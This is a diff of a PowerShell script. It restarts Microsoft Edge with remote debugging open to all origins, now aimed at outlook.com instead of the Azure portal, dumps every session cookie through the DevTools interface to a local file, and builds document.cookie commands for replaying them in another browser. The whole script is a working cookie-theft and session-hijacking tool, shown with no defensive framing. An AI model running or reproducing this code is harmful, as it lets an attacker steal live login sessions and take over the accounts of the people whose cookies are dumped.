@@ -1,5 +1,7 @@
 Get-Process msedge | Stop-Process
-Start-Process "msedge.exe" "https://portal.azure.com --remote-debugging-port=9222 --remote-allow-origins=* --restore-last-session"
+Start-Process "msedge.exe" "https://outlook.com --remote-debugging-port=9222 --remote-allow-origins=* --restore-last-session"
+
+Start-Sleep 10
 
 $jsonResponse = Invoke-WebRequest 'http://localhost:9222/json' -UseBasicParsing
 $devToolsPages = ConvertFrom-Json $jsonResponse.Content
@@ -28,6 +30,7 @@ $ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "Clo
 try {
     $response = ConvertFrom-Json $completeMessage.ToString()
     $cookies = $response.result.cookies
+    # $cookies
 } catch {
     Write-Host "Error parsing JSON data."
 }
@@ -35,28 +38,19 @@ try {
 $cookieName = "*"  
 $specificCookies = $cookies | Where-Object { $_.name -like $cookieName }
 
-# Create an array to store the formatted cookie objects
-$cookieObjects = @()  
-
+$cookieCommands = @()  
 foreach ($cookie in $specificCookies) {
-    # Create a hashtable representing each cookie in a format compatible for import
-    $cookieObject = @{
-        name       = $cookie.name
-        value      = $cookie.value
-        domain     = $cookie.domain
-        path       = $cookie.path
-        secure     = $cookie.secure
-        httpOnly   = $cookie.httpOnly
-        expirationDate = $cookie.expires
-    }
+    $escapedValue = $cookie.value -replace "'", "\'"
+    $escapedPath = $cookie.path -replace "'", "\'"
+    $escapedDomain = $cookie.domain -replace "'", "\'"
 
-    # Add the cookie object to the array
-    $cookieObjects += $cookieObject
+    $cookieCommand = "document.cookie='" + $cookie.name + "=" + $escapedValue +
+                     "; Path=" + $escapedPath + "; Domain=" + $escapedDomain + ";secure';"
+    $cookieCommands += $cookieCommand
 }
 
-# Convert the cookie objects array to JSON
-$cookieJson = $cookieObjects | ConvertTo-Json -Depth 3
-
-# Output to the console and copy to clipboard
-$cookieJson | Out-File C:\temp\cookiesjson.txt
-Set-Clipboard -Value $cookieJson
+# Join all commands into one long string to be executed in a browser console
+#$allCookieCommands = $cookieCommands -join " "
+#Write-Host $allCookieCommands
+#Set-Clipboard -Value $allCookieCommands
+$cookies | ConvertTo-Json | Out-File C:\temp\cookies.txt
